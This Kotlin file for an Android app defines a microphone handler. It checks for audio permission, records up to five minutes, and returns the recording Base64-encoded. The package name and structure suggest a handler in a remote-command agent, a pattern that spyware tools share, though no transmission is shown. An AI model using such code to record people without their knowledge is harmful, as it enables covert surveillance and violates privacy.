package com.alingo.agent.handlers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File

object MicHandler {

    private const val TAG = "MicHandler"

    suspend fun record(context: Context, durationSeconds: Int): Map<String, Any?> =
        withContext(Dispatchers.IO) {

            if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
                return@withContext mapOf("error" to "Microphone permission not granted")
            }

            val safeDuration = durationSeconds.coerceIn(5, 300)
            val outputFile = File(context.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
            var recorder: MediaRecorder? = null

            try {
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                recorder.setAudioSamplingRate(44100)
                recorder.setAudioEncodingBitRate(128000)
                recorder.setOutputFile(outputFile.absolutePath)
                recorder.prepare()
                recorder.start()

                Log.i(TAG, "Recording started for ${safeDuration}s")
                delay(safeDuration * 1000L)

                try {
                    recorder.stop()
                } catch (stopErr: RuntimeException) {
                    Log.e(TAG, "Stop failed: ${stopErr.message}")
                }
                try { recorder.release() } catch (e: Exception) {}
                recorder = null

                val bytes = outputFile.readBytes()
                if (bytes.isEmpty()) {
                    outputFile.delete()
                    return@withContext mapOf("error" to "Recording empty")
                }

                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                outputFile.delete()

                Log.i(TAG, "Recorded ${bytes.size} bytes")
                mapOf(
                    "audio_base64" to base64,
                    "duration" to safeDuration,
                    "format" to "m4a",
                    "size" to bytes.size
                )
            } catch (e: Exception) {
                try { recorder?.release() } catch (ex: Exception) {}
                outputFile.delete()
                Log.e(TAG, "Recording failed: ${e.message}")
                mapOf("error" to "Recording failed: ${e.message}")
            }
        }
}
